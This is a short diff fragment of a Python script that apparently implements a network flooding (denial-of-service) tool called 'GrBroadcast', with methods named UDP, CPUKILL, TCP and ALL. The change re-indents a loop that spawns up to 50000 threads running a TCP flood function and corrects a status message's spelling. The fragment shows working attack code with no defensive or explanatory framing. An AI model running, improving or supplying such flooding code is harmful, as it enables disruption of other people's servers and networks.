@@ -211,9 +211,8 @@ if method == "UDP" or method == "CPUKILL" or method == "TCP" or method == "ALL" 
                     sock.send(grtools)
                 sock.close()
 
-for x in range(50000):
-    if method == "TCP":
-        t = threading.Thread(target=tcpfl)
-	print("[GrBroadcast] Succesfully sended ")
-        t.start()
-  
+    for x in range(50000):
+        if method == "TCP":
+            t = threading.Thread(target=tcpfl)
+            print("[GrBroadcast] Successfully sent")
+            t.start()
